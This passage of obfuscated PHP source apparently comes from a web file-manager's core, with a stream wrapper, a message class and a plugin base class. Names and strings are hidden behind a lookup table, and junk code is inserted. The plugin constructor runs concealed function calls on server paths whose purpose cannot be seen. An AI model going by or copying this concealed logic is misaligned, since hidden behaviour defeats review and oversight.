$ú¾‚ø[91] ? $ú¾‚ø[1239] : $ú¾‚ø[12]); $ë¥—™Ä€[] = trim(implode($ú¾‚ø[53], $µ ‰Â‡™)); } foreach ($…ƒ©ñ…• as $¯€àòòÔ => $ã´ƒÙúû) { if ($¯€àòòÔ == $ú¾‚ø[1214]) { $ÕËİŒšş = $œ„Šêúå = $ú¾‚ø[1240] . $ÜšıÍ—Ú . $ú¾‚ø[1241]; } else { $ÕËİŒšş = (stripos($¯€àòòÔ, $ú¾‚ø[11]) ? $ú¾‚ø[1242] : $ú¾‚ø[12]) . ($ú¾‚ø[1243] . $¯€àòòÔ . $ú¾‚ø[1244] . $ã´ƒÙúû); } $ë¥—™Ä€[] = $ÕËİŒšş; } if ($ÜšıÍ—Ú && !$œ„Šêúå) { $ë¥—™Ä€ = array_merge(array($ú¾‚ø[1240] . $ÜšıÍ—Ú . $ú¾‚ø[1241]), $ë¥—™Ä€); } $ä€œ®É = array($ú¾‚ø[1245] . $—ğ©¯ . $ú¾‚ø[1246], $ú¾‚ø[1247] . $—ğ©¯ . $ú¾‚ø[1248], implode($ú¾‚ø[50] . PHP_EOL, $ë¥—™Ä€), $ú¾‚ø[1249]); $ô‹ŒÉ«í = implode(PHP_EOL, $ä€œ®É); if ($¶”½Ö‹ && $¶”½Ö‹ == $ú¾‚ø[903]) { return $ô‹ŒÉ«í; } $µ’Ø¶ç = array($ú¾‚ø[903] => $ô‹ŒÉ«í, $ú¾‚ø[13] => $Â¢Î˜ïñ); return $¶”½Ö‹ ? $µ’Ø¶ç[$¶”½Ö‹] : $µ’Ø¶ç; } } goto cõÂåé»©´; Ağ‹İ½‹…ˆ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÉÇ÷ì, $ŠŒ«…öó = '') { $this->info = $this->info($ÉÇ÷ì); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÅÄÇĞô][87]]; $this->pathOpen = $ÉÇ÷ì; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÉÇ÷ì])) { self::$_chunkBuffer[$ÉÇ÷ì] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($‘Êô­•ë) { $ úÃ”­„ = $this->fileSubstr($this->pose, $‘Êô­•ë); $this->pose += strlen($ úÃ”­„); return $ úÃ”­„; } public function stream_tell() { return $this->pose; } public function stream_seek($÷í”±®, $î™ïøî’) { $È®ßÚš =& $_SERVER[ÅÄÇĞô]; if ($î™ïøî’ == SEEK_SET) { $this->pose = $÷í”±®; } else { if ($î™ïøî’ == SEEK_CUR) { $this->pose += $÷í”±®; } else { if ($î™ïøî’ == SEEK_END) { $this->pose = $this->info[$È®ßÚš[79]] + intval($÷í”±®); } } } if ($÷í”±® < 0) { $this->pose = $this->info[$È®ßÚš[79]] + $÷í”±®; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÅÄÇĞô][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($òå’°æ¸, $ë±èİùÈ) { $…Õ©¤ƒë =& $_SERVER[ÅÄÇĞô]; $£É…Éİ† = $this->info($òå’°æ¸); return array($…Õ©¤ƒë[1423] => 0, $…Õ©¤ƒë[1633] => 0, $…Õ©¤ƒë[16] => 32768 + 511, $…Õ©¤ƒë[1634] => 0, $…Õ©¤ƒë[1635] => 0, $…Õ©¤ƒë[1636] => 0, $…Õ©¤ƒë[1637] => 0, $…Õ©¤ƒë[79] => $£É…Éİ†[$…Õ©¤ƒë[79]], $…Õ©¤ƒë[1638] => $£É…Éİ†[$…Õ©¤ƒë[1478]], $…Õ©¤ƒë[1595] => $£É…Éİ†[$…Õ©¤ƒë[88]], $…Õ©¤ƒë[1594] => $£É…Éİ†[$…Õ©¤ƒë[234]], $…Õ©¤ƒë[1639] => 0, $…Õ©¤ƒë[1640] => 0); } static $fileInfo = array(); public function info($Éß“ç®) { $‡µ††Í¶ = $_SERVER[ÅÄÇĞô][1641]; if (isset(self::$fileInfo[$Éß“ç®])) { return self::$fileInfo[$Éß“ç®]; } if (substr($Éß“ç®, 0, strlen($‡µ††Í¶)) != $‡µ††Í¶) { return !1; } self::$fileInfo[$Éß“ç®] = IO::info(substr($Éß“ç®, strlen($‡µ††Í¶))); return self::$fileInfo[$Éß“ç®]; } public static function read($ÎËŞ¦×, $Ã„ä˜éÀ, $É©É•·) { if (!isset(self::$_fopenCache[$ÎËŞ¦×])) { $œâÛ¼â¦ = new StreamWrapperIO(); $œâÛ¼â¦->stream_open($ÎËŞ¦×); self::$_fopenCache[$ÎËŞ¦×] = $œâÛ¼â¦; } $œâÛ¼â¦ = self::$_fopenCache[$ÎËŞ¦×]; return $œâÛ¼â¦->fileSubstr($Ã„ä˜éÀ, $É©É•·); } public static function _read($êÍõ‹ñ¼, $³êÂÄ“®, $ÅˆêšüË) { $ëò¹Çæ­ =& $_SERVER[ÅÄÇĞô]; $å‘³±Ä = fopen($êÍõ‹ñ¼, $ëò¹Çæ­[1482]); if (!$å‘³±Ä) { return $ëò¹Çæ­[12]; } $ÕÏîÎÏ² = 8192; fseek($å‘³±Ä, $³êÂÄ“®, SEEK_SET); $óğæ£²‰ = $ëò¹Çæ­[12]; $ØµâñâÁ = 0; while ($ØµâñâÁ < $ÅˆêšüË) { $ŒÍÍ–³­ = min($ÕÏîÎÏ², $ÅˆêšüË - $ØµâñâÁ); $óğæ£²‰ .= fread($å‘³±Ä, $ŒÍÍ–³­); $ØµâñâÁ += $ŒÍÍ–³­; } fclose($å‘³±Ä); return $óğæ£²‰; } public function fileSubstr($ä˜¯áĞœ, $¸®¥†ÁÈ) { $®ÑÚ¿³© =& $_SERVER[ÅÄÇĞô]; $İ«Ùúã· = $this->info[$®ÑÚ¿³©[79]]; $¤Õ¹æôÏ = $ä˜¯áĞœ; $ÖæµìÉ = $¸®¥†ÁÈ; if ($ä˜¯áĞœ < 0) { $ä˜¯áĞœ = $İ«Ùúã· + $ä˜¯áĞœ; } if ($¸®¥†ÁÈ === !1) { $¸®¥†ÁÈ = $İ«Ùúã· - $ä˜¯áĞœ; } if ($ä˜¯áĞœ + $¸®¥†ÁÈ > $İ«Ùúã·) { $¸®¥†ÁÈ = $İ«Ùúã· - $ä˜¯áĞœ; } if ($¸®¥†ÁÈ <= 0) { return $®ÑÚ¿³©[12]; } if ($ä˜¯áĞœ < 0 || $ä˜¯áĞœ >= $İ«Ùúã· || $¸®¥†ÁÈ <= 0 || $¸®¥†ÁÈ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\x6c\x65\122\145\141\x64\40\145\162\162\157\x72\x21\40\x73\x74\141\162\x74\75{$ä˜¯áĞœ}\73\154\x65\x6e\147\164\150\x3d{$¸®¥†ÁÈ}\73\40\x73\x69\x7a\x65\75{$İ«Ùúã·}\x3b"); } $¶Í¯Œ«° = 64 * 1024; $ÂËùüİ„ =& self::$_chunkBuffer[$this->path]; if (!$ÂËùüİ„) { $ÂËùüİ„ = array(); } $€¿Øƒæ‰ = 0; $–¬¿÷¹‡ = 0; $˜«¸Ş¤ = $®ÑÚ¿³©[12]; foreach ($ÂËùüİ„ as $€¿Øƒæ‰ => $˜«¸Ş¤) { $€¿Øƒæ‰ = intval($€¿Øƒæ‰); $–¬¿÷¹‡ = $€¿Øƒæ‰ + strlen($˜«¸Ş¤); if ($ä˜¯áĞœ >= $–¬¿÷¹‡) { continue; } if ($ä˜¯áĞœ >= $€¿Øƒæ‰ && $ä˜¯áĞœ + $¸®¥†ÁÈ <= $–¬¿÷¹‡) { return substr($˜«¸Ş¤, $ä˜¯áĞœ - $€¿Øƒæ‰, $¸®¥†ÁÈ); } break; } if (count($ÂËùüİ„) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($®ÑÚ¿³©[1642], $®ÑÚ¿³©[1643] . count($ÂËùüİ„) . "\73\x73\164\141\x72\164\75{$ä˜¯áĞœ}\x2c\154\145\x6e\147\164\x68\x3d{$¸®¥†ÁÈ}\x3b\x70\x6f\163\145\x3a{$€¿Øƒæ‰}\x7e{$–¬¿÷¹‡}"); throw new Exception($®ÑÚ¿³©[1644]); } $Û¢Àæ† = intval($ä˜¯áĞœ / $¶Í¯Œ«°) * $¶Í¯Œ«°; $ƒ³„”§“ = ceil(($ä˜¯áĞœ + $¸®¥†ÁÈ) / $¶Í¯Œ«°) * $¶Í¯Œ«° - $Û¢Àæ†; $ùØ˜Ã‘ß = IO::fileSubstr($this->path, $Û¢Àæ†, $ƒ³„”§“); $ÂËùüİ„[$Û¢Àæ† . $®ÑÚ¿³©[12]] = $ùØ˜Ã‘ß; ksort($ÂËùüİ„); $¶Æ«œÍİ = substr($ùØ˜Ã‘ß, $ä˜¯áĞœ - $Û¢Àæ†, $¸®¥†ÁÈ); return $¶Æ«œÍİ; } private function log($ÔüÚ˜é, $Îé©ö£Î) { $Úø’ì› =& $_SERVER[ÅÄÇĞô]; $˜ÎÛº’ì = timeFloat() - $this->timeStart; write_log(sprintf($Úø’ì›[1645], $ÔüÚ˜é, $this->info[$Úø’ì›[32]], $˜ÎÛº’ì, $Îé©ö£Î), $Úø’ì›[1287]); } } class Message { function __construct() { } public function send($òÙØÁ = '', $ß—ÈŞ— = array(), $š©æÙÇÙ = "\164\x65\170\164") { $¼ÄîÄ¥• =& $_SERVER[ÅÄÇĞô]; $¶Ğ€ËÍ™ = array($¼ÄîÄ¥•[33] => $¼ÄîÄ¥•[1236], $¼ÄîÄ¥•[171] => $òÙØÁ); if (in_array($š©æÙÇÙ, array($¼ÄîÄ¥•[1236], $¼ÄîÄ¥•[1646]))) { $¶Ğ€ËÍ™[$¼ÄîÄ¥•[33]] = $š©æÙÇÙ; } $ß—ÈŞ— = array($¼ÄîÄ¥•[583] => isset($ß—ÈŞ—[$¼ÄîÄ¥•[583]]) ? $ß—ÈŞ—[$¼ÄîÄ¥•[583]] : $¼ÄîÄ¥•[12], $¼ÄîÄ¥•[670] => isset($ß—ÈŞ—[$¼ÄîÄ¥•[670]]) ? $ß—ÈŞ—[$¼ÄîÄ¥•[670]] : $¼ÄîÄ¥•[12]); if (empty($òÙØÁ) || empty($ß—ÈŞ—[$¼ÄîÄ¥•[583]]) && empty($ß—ÈŞ—[$¼ÄîÄ¥•[670]])) { return !1; } $´Ä¦Ùèò = array($¼ÄîÄ¥•[1575] => $¶Ğ€ËÍ™, $¼ÄîÄ¥•[1647] => $ß—ÈŞ—); Hook::trigger($¼ÄîÄ¥•[1648], $´Ä¦Ùèò); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $²³†Ìİı =& $_SERVER[ÅÄÇĞô]; if ($_SERVER[$²³†Ìİı[837]] != $_SERVER[$²³†Ìİı[1552]]) { $šÃûô¦Æ = $²³†Ìİı[978]; $µœÔı® = $²³†Ìİı[838]; $å½ÆÔ² = $_SERVER[$²³†Ìİı[839]] . $²³†Ìİı[840]; $õäÃ“úß = $µœÔı®($å½ÆÔ²); $‚³¤Ø˜ = explode($²³†Ìİı[288], $õäÃ“úß); if (count($‚³¤Ø˜) < $²³†Ìİı[699]) { $¤è²èÉ = $²³†Ìİı[841]; $¤è²èÉ(); } $á²ìª = $²³†Ìİı[979]; $á²ìª($_SERVER[$²³†Ìİı[980]]); $á²ìª($_SERVER[$²³†Ìİı[839]] . $²³†Ìİı[1649]); $¸Û‘â¥ = 1; while ($¸Û‘â¥ > 1) { $¸Û‘â¥ = $¸Û‘â¥ + 4; $ÇœÔŒÈ = rawurlencode($¸Û‘â¥ . $²³†Ìİı[457]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($²³†Ìİı[1650]); $this->pluginName = str_replace($²³†Ìİı[1650], $²³†Ìİı[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $²³†Ìİı[8]; $this->pluginApi = appHostGet() . $²³†Ìİı[1651] . $this->pluginName . $²³†Ìİı[8]; $this->pluginHost = $config[$²³†Ìİı[1652]] . $this->pluginName . $²³†Ìİı[8]; $this->pluginHostDefault = $config[$²³†Ìİı[1652]] . $this->pluginName . $²³†Ìİı[8]; $µÙå¦öŞ = $config[$²³†Ìİı[1653]]; if ($µÙå¦öŞ && strpos($²³†Ìİı[50] . $µÙå¦öŞ . $²³†Ìİı[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$²³†Ìİı[1654]] . $this->pluginName . $²³†Ìİı[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÅÄÇĞô][1655]); } protected function assign($Ö„âºœ‘, $úú×üÀ¯ = false) { if (is_array($Ö„âºœ‘)) { $this->values = array_merge($this->values, $Ö„âºœ‘); } else { $this->values[$Ö„âºœ‘] = $úú×üÀ¯; } } protected function display($Ç³¢…×Å) { extract($this->values); require $Ç³¢…×Å; } final function hookRegist($¦–“Üæí) { $this->modelPlugin->appRegist($this->pluginName, $¦–“Üæí); } final function appIcon() { $ô™óÂ˜ =& $_SERVER[ÅÄÇĞô]; $ú»¸á‚± = $this->appPackage(); $«í­’‘¼ = $ô™óÂ˜[12]; if (isset($ú»¸á‚±[$ô™óÂ˜[493]])) { if (isset($ú»¸á‚±[$ô™óÂ˜[493]][$ô™óÂ˜[1656]])) { $«í­’‘¼ = $ô™óÂ˜[1657] . $ú»¸á‚±[$ô™óÂ˜[493]][$ô™óÂ˜[1656]] . $ô™óÂ˜[1658]; } else { if ($ú»¸á‚±[$ô™óÂ˜[493]][$ô™óÂ˜[1659]]) { $«í­’‘¼ = $ô™óÂ˜[1660] . $ú»¸á‚±[$ô™óÂ˜[493]][$ô™óÂ˜[1659]] . $ô™óÂ˜[1661]; } } } return $«í­’‘¼; } final function fileCanView($âàŞ¨èÅ) { $ƒæÂÜ½ =& $_SERVER[ÅÄÇĞô]; if (request_url_safe($âàŞ¨èÅ)) { return !0; } if ($this->isShare($âàŞ¨èÅ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $©Öà‚Ã÷ = $ƒæÂÜ½[1662] . rawurlencode(this_url()); show_tips(LNG($ƒæÂÜ½[1663]) . $ƒæÂÜ½[1664] . $©Öà‚Ã÷ . $ƒæÂÜ½[1665] . LNG($ƒæÂÜ½[1666]) . $ƒæÂÜ½[1667], !1); } if (!Action($ƒæÂÜ½[1668])->authCan($ƒæÂÜ½[1669])) { show_tips(LNG($ƒæÂÜ½[1670]) . $ƒæÂÜ½[1671], !1); } ActionCall($ƒæÂÜ½[1672], $âàŞ¨èÅ); } final function isShare($—’ûŠû) { $©½•„¢“ = KodIO::parse($—’ûŠû); return $©½•„¢“[$_SERVER[ÅÄÇĞô][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($õ€”òå¹) { if (request_url_safe($õ€”òå¹)) { return $õ€”òå¹; } if (!$this->isShare($õ€”òå¹)) { $õ€”òå¹ = $this->filePath($õ€”òå¹, !1); } return Action($_SERVER[ÅÄÇĞô][1279])->linkOut($õ€”òå¹); } public function filePathLinkOut($¹†á©¦¹) { if (request_url_safe($¹†á©¦¹)) { return $¹†á©¦¹; } $this->fileCanView($¹†á©¦¹); return Action($_SERVER[ÅÄÇĞô][1279])->link($¹†á©¦¹); } final function filePath($Õ€­Ÿ³, $òˆ¨Äãë = true, $ó¦ÛÈâ = false) { $–ŞëÈØ” =& $_SERVER[ÅÄÇĞô]; $Õ¦‡×÷æ = $this->filePathGet($Õ€­Ÿ³, $òˆ¨Äãë); if (!$this->fileInfo) { show_tips(LNG($–ŞëÈØ”[108]), !1); } if ($ó¦ÛÈâ && isset($this->fileInfo[$–ŞëÈØ”[546]]) && $this->fileInfo[$–ŞëÈØ”[546]]) { $“ìêºŠ = Model($–ŞëÈØ”[549])->fileInfo($this->fileInfo[$–ŞëÈØ”[546]]); if (!$“ìêºŠ || !IO::exist($“ìêºŠ[$–ŞëÈØ”[87]])) { $«§÷Ø’ê = LNG($–ŞëÈØ”[108]) . LNG($–ŞëÈØ”[1673]); if (KodUser::isRoot() && isset($“ìêºŠ[$–ŞëÈØ”[87]])) { $«§÷Ø’ê .= $–ŞëÈØ”[1674] . $“ìêºŠ[$–ŞëÈØ”[87]] . $–ŞëÈØ”[1675]; } show_tips($«§÷Ø’ê); } } Hook::trigger($–ŞëÈØ”[1676], $Õ¦‡×÷æ); return $Õ¦‡×÷æ; } final function filePathGet($é˜öĞå™, $êÍÊİõõ = true) { $óä•½ê½ =& $_SERVER[ÅÄÇĞô]; if ($şÂ×•£Û = $this->checkSharePath($é˜öĞå™, $êÍÊİõõ)) { return $şÂ×•£Û; } $this->fileCanView($é˜öĞå™); if (request_url_safe($é˜öĞå™)) { $½¦ªÒ¢æ = parse_url_query($é˜öĞå™); if (isset($½¦ªÒ¢æ[$óä•½ê½[1677]]) && isset($½¦ªÒ¢æ[$óä•½ê½[237]])) { $­…âÈ¼³ = Mcrypt::decode($½¦ªÒ¢æ[$óä•½ê½[237]], Model($óä•½ê½[865])->get($óä•½ê½[866])); if ($­…âÈ¼³) { $this->fileInfo = IO::info($­…âÈ¼³); $this->fileInfo[$óä•½ê½[1678]] = $é˜öĞå™; $this->cachePath = $this->pluginCachePath($óä•½ê½[12], $êÍÊİõõ); return $­…âÈ¼³; } } $é˜öĞå™ = $this->_cacheHttpFile($é˜öĞå™, $êÍÊİõõ); $this->fileInfo = IO::info($é˜öĞå™); } else { $this->fileInfo = IO::info($é˜öĞå™); $this->cachePath = $this->pluginCachePath($óä•½ê½[12], $êÍÊİõõ); } return $é˜öĞå™; } final function _cacheHttpFile($÷ŸËÓ¼·, $ŸìÁ›Ìâ = true) { $É™ú¶Çœ =& $_SERVER[ÅÄÇĞô]; $Ê¼¬Æ¿ = parse_url_query($÷ŸËÓ¼·); $ŞÔ°­åÅ = get_path_ext($÷ŸËÓ¼·); if (isset($Ê¼¬Æ¿[$É™ú¶Çœ[32]]) && $Ê¼¬Æ¿[$É™ú¶Çœ[32]]) { $ŞÔ°­åÅ = get_path_ext($Ê¼¬Æ¿[$É™ú¶Çœ[32]]); } $¾ä©ËÉì = hash_path($÷ŸËÓ¼·) . $É™ú¶Çœ[10] . $ŞÔ°­åÅ; $this->cachePath = $this->pluginCachePath($ŸìÁ›Ìâ ? $¾ä©ËÉì : $É™ú¶Çœ[12]); $Á¯ŠŠú§ = IO::fileNameExist($this->cachePath, $¾ä©ËÉì); if ($Á¯ŠŠú§) { return KodIO::make($Á¯ŠŠú§); } $œÊôÅƒƒ = rtrim($this->cachePath, $É™ú¶Çœ[8]) . $É™ú¶Çœ[8] . $¾ä©ËÉì; return $this->pluginCacheFileSet($œÊôÅƒƒ, file_get_contents_nossl($÷ŸËÓ¼·)); } final function checkSharePath($ÀÄ¾³ƒ², $ªÁ†×í = true) { $˜ÓÛ£Ï… =& $_SERVER[ÅÄÇĞô]; if (!$this->isShare($ÀÄ¾³ƒ²)) { return !1; } $¼›ÎÇ¶ã = Action($˜ÓÛ£Ï…[1279])->sharePathInfo($ÀÄ¾³ƒ²); if (!is_array($¼›ÎÇ¶ã) || !isset($¼›ÎÇ¶ã[$˜ÓÛ£Ï…[87]])) { show_json(LNG($˜ÓÛ£Ï…[1679]), !1); } $this->fileInfo = $¼›ÎÇ¶ã; $this->cachePath = $this->pluginCachePath(!1, $ªÁ†×í); return $¼›ÎÇ¶ã[$˜ÓÛ£Ï…[87]]; } final function pluginCachePath($âÍµß‚ = '', $ÍÓ¬ğ©ç = false) { $ÓóìÔ•§ =& $_SERVER[ÅÄÇĞô]; if ($ÍÓ¬ğ©ç && is_array($this->fileInfo)) { $âÍµß‚ = kodIO::hashPath($this->fileInfo); } $ĞÆë¢”£ = rtrim(IO_PATH_SYSTEM_TEMP . $ÓóìÔ•§[1680] . $this->pluginName . $ÓóìÔ•§[8] . $âÍµß‚, $ÓóìÔ•§[8]); $Ù¶³ÆŠ¿ = IO::infoFullSimple($ĞÆë¢”£); $œ¾§æ¨Ê = $Ù¶³ÆŠ¿ && is_array($Ù¶³ÆŠ¿) ? $Ù¶³ÆŠ¿[$ÓóìÔ•§[87]] : $ÓóìÔ•§[12]; if (!$œ¾§æ¨Ê) { $œ¾§æ¨Ê = IO::mkdir($ĞÆë¢”£); } return $œ¾§æ¨Ê; } final function pluginCacheFileSet($˜üàˆã, $Äá»˜á– = '') { $»¥–µ¾ =& $_SERVER[ÅÄÇĞô]; $—ô‹¨ú = IO::infoFullSimple($˜üàˆã); if (!$—ô‹¨ú) { return IO::mkfile($˜üàˆã, $Äá»˜á–, REPEAT_REPLACE); } IO::setContent($—ô‹¨ú[$»¥–µ¾[87]], $Äá»˜á–); return $—ô‹¨ú[$»¥–µ¾[87]]; } final function pluginLocalFile($â¥ı–­ø = '') { $ÀĞõàä‘ =& $_SERVER[ÅÄÇĞô]; $Îà¿Ó·ª = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($Îà¿Ó·ª)) { mk_dir($Îà¿Ó·ª); } if (!$â¥ı–­ø) { return $Îà¿Ó·ª; } $ÑËó«ú = IO::info($â¥ı–­ø); $Æö¨üæâ = $ÀĞõàä‘[1681] . KodIO::hashPath($ÑËó«ú) . $ÀĞõàä‘[10] . $ÑËó«ú[$ÀĞõàä‘[169]]; if (!checkExtSafe($Æö¨üæâ)) { $Æö¨üæâ = $Æö¨üæâ . $ÀĞõàä‘[1314]; } $ÒÊĞ¥â = $Îà¿Ó·ª . $Æö¨üæâ; if (@file_exists($ÒÊĞ¥â)) { return $ÒÊĞ¥â; } return IO::copy($â¥ı–­ø, $Îà¿Ó·ª, 0, $Æö¨üæâ); } final function appPackage() { $ÉúÎ–¨ =& $_SERVER[ÅÄÇĞô]; if ($this->packageData) { return $this->packageData; } $êá–¶§® = $this->parseFile($this->pluginPath . $ÉúÎ–¨[1682]); $this->parseLang($êá–¶§®); $à»æ½ë = json_decode_force($êá–¶§®); if (!$à»æ½ë) { return array(); } $Ş°äû¥î = Hook::trigger($ÉúÎ–¨[1683], $à»æ½ë); if ($Ş°äû¥î && is_array($Ş°äû¥î)) { $à»æ½ë = $Ş°äû¥î; } $this->packageData = $à»æ½ë; return $à»æ½ë; } public function packageInfoGet($˜¾ßàŠ) { $Š•Ø®í™ = $this->appPackage(); return array_get_value($Š•Ø®í™, $˜¾ßàŠ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÅÄÇĞô][1684]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÅÄÇĞô][1685]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÅÄÇĞô][1686]); } public function echoJsAssign($º»›·…Ö, $åÖ÷¹ğü) { $this->echoJsAssignArr[$º»›·…Ö] = $åÖ÷¹ğü; } private function parseFile($—Ò›œş) { $ÀÁæĞë =& $_SERVER[ÅÄÇĞô]; $ç¤ò©Ú’ = file_get_contents_nossl($—Ò›œş); $¦¸¹±½÷ = array($ÀÁæĞë[1687], $ÀÁæĞë[1688], $ÀÁæĞë[1689], $ÀÁæĞë[1690], $ÀÁæĞë[1691], $ÀÁæĞë[1692], $ÀÁæĞë[1693]); $Ï›ÜäÑ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ÀÁæĞë[92]][$ÀÁæĞë[1694]]); foreach ($this->echoJsAssignArr as $“¤âµ‡ => $³Ìå¼›) { $¦¸¹±½÷[] = $ÀÁæĞë[1695] . $“¤âµ‡ . $ÀÁæĞë[1696]; $Ï›ÜäÑ[] = is_array($³Ìå¼›) || is_object($³Ìå¼›) ? rawurlencode(json_encode($³Ìå¼›)) : $³Ìå¼›; } if (strstr($ç¤ò©Ú’, $ÀÁæĞë[1697])) { $Ğå‹Ãşœ = rawurlencode(json_encode($this->pluginLangArr)); $ç¤ò©Ú’ = str_replace($ÀÁæĞë[1697], $Ğå‹Ãşœ, $ç¤ò©Ú’); } if (strstr($ç¤ò©Ú’, $ÀÁæĞë[1698])) { $Ğå‹Ãşœ = $Ğå‹Ãşœ = rawurlencode(json_encode($this->getConfig())); $ç¤ò©Ú’ = str_replace($ÀÁæĞë[1698], $Ğå‹Ãşœ, $ç¤ò©Ú’); } $ç¤ò©Ú’ = str_replace($¦¸¹±½÷, $Ï›ÜäÑ, $ç¤ò©Ú’); return $ç¤ò©Ú’; } private function parseLang(&$Ù¸ÃÛÌÖ) { $šüÂ´ş÷ =& $_SERVER[ÅÄÇĞô]; $—æÆÚš = $šüÂ´ş÷[1699]; if (!strstr($Ù¸ÃÛÌÖ, $—æÆÚš)) { return; } preg_match_all($šüÂ´ş÷[1700], $Ù¸ÃÛÌÖ, $í§Çî»ª); if (!is_array($í§Çî»ª) || count($í§Çî»ª) == 0 || !is_array($í§Çî»ª[0]) || count($í§Çî»ª[0]) == 0) { return; } $³şèØÙĞ = array(); $æ¡£”Öø = array(); foreach ($í§Çî»ª[0] as $ŒÈ¬Ÿ¦) { $ ‘ÀÂä® = substr($ŒÈ¬Ÿ¦, strlen($—æÆÚš), -4); $­·¸‡ö£ = LNG($ ‘ÀÂä®); $³şèØÙĞ[] = $ŒÈ¬Ÿ¦; $æ¡£”Öø[] = str_replace(array($šüÂ´ş÷[288], $šüÂ´ş÷[1179], $šüÂ´ş÷[420], $šüÂ´ş÷[121]), array($šüÂ´ş÷[53], $šüÂ´ş÷[53], $šüÂ´ş÷[12], $šüÂ´ş÷[1701]), $­·¸‡ö£); } $Ù¸ÃÛÌÖ = str_replace($³şèØÙĞ, $æ¡£”Öø, $Ù¸ÃÛÌÖ); } private function parseConfig(&$‡Ã¨É‹æ) { $…Ğ•¡ò² =& $_SERVER[ÅÄÇĞô]; $›öã®”à = $…Ğ•¡ò²[1702]; if (!strstr($‡Ã¨É‹æ, $›öã®”à)) { return; } preg_match_all($…Ğ•¡ò²[1703], $‡Ã¨É‹æ, $˜™Û™Ğ×); if (!is_array($˜™Û™Ğ×) || count($˜™Û™Ğ×) == 0 || !is_array($˜™Û™Ğ×[0]) || count($˜™Û™Ğ×[0]) == 0) { return; } $›€‡°†‹ = $this->getConfig(); $±øÎ‘¡Å = array(); $ÉµôÅ¥‘ = array(); foreach ($˜™Û™Ğ×[0] as $£ê“·›ö) { $ÉŞŸÄ¦ø = substr($£ê“·›ö, strlen($›öã®”à), -2); $±øÎ‘¡Å[] = $£ê“·›ö; $ÉµôÅ¥‘[] = _get($›€‡°†‹, $ÉŞŸÄ¦ø); } $‡Ã¨É‹æ = str_replace($±øÎ‘¡Å, $ÉµôÅ¥‘, $‡Ã¨É‹æ); } private function parsePackage(&$ïÆ÷¥— ) { $ËµÁÔÒÁ =& $_SERVER[ÅÄÇĞô]; $™²É¦À = $ËµÁÔÒÁ[1704]; if (!strstr($ïÆ÷¥— , $™²É¦À)) { return; } preg_match_all($ËµÁÔÒÁ[1705], $ïÆ÷¥— , $¶½ß’ç ); if (!is_array($¶½ß’ç ) || count($¶½ß’ç ) == 0 || !is_array($¶½ß’ç [0]) || count($¶½ß’ç [0]) == 0) { return; } $Œ–Ë‚Ö = $this->appPackage(); $•Î¡Âó = array(); $à¥ì•å„ = array(); foreach ($¶½ß’ç [0] as $–àù¨åÒ) { $‡äÌĞÖË = substr($–àù¨åÒ, strlen($™²É¦À), -2); $•Î¡Âó[] = $–àù¨åÒ; $à¥ì•å„[] = _get($Œ–Ë‚Ö, $‡äÌĞÖË); } $ïÆ÷¥—  = str_replace($•Î¡Âó, $à¥ì•å„, $ïÆ÷¥— ); } final function echoFile($ĞµíÕ¾½, $úäÛµü´ = false) { $¯çÂÖõ¥ =& $_SERVER[ÅÄÇĞô]; $ÄÂšŒÈ = $this->pluginPath . $ĞµíÕ¾½; if (ACT == $¯çÂÖõ¥[1706]) { echo $¯çÂÖõ¥[1707] . $this->pluginName . $¯çÂÖõ¥[8] . $ĞµíÕ¾½ . $¯çÂÖõ¥[1708]; if (!file_exists($ÄÂšŒÈ)) { echo $¯çÂÖõ¥[1709]; return; } } $ß¥œÇĞ = $this->parseFile($ÄÂšŒÈ); $this->parseLang($ß¥œÇĞ); $this->parseConfig($ß¥œÇĞ); $this->parsePackage($ß¥œÇĞ); if (is_array($úäÛµü´)) { $ß¥œÇĞ = str_replace(array_keys($úäÛµü´), array_values($úäÛµü´), $ß¥œÇĞ); } echo $¯çÂÖõ¥[288] . $ß¥œÇĞ; } private function checkVersion() { $ç»ÇŒÆß =& $_SERVER[ÅÄÇĞô]; $™ÜÚ–ö = $this->appPackage(); $ß‡ğ¶ğ = $this->getConfig(); if ($ß‡ğ¶ğ[$ç»ÇŒÆß[1710]] == $™ÜÚ–ö[$ç»ÇŒÆß[1684]]) { return; } $this->regist(); $this->setConfig(array($ç»ÇŒÆß[1710] => $™ÜÚ–ö[$ç»ÇŒÆß[1684]])); } final function initLang() { $ı´®¦Æ =& $_SERVER[ÅÄÇĞô]; $Áƒí¢Ê” = $ı´®¦Æ[1711]; $Æ“Ü× = $this->pluginPath . $ı´®¦Æ[1712]; $Èº¯ÑØª = I18n::getType(); $ˆö£·› = array(); if (file_exists($Æ“Ü× . $Èº¯ÑØª . $ı´®¦Æ[939])) { $ˆö£·› = (include $Æ“Ü× . $Èº¯ÑØª . $ı´®¦Æ[939]); } else { if ($Èº¯ÑØª == $ı´®¦Æ[1713] && 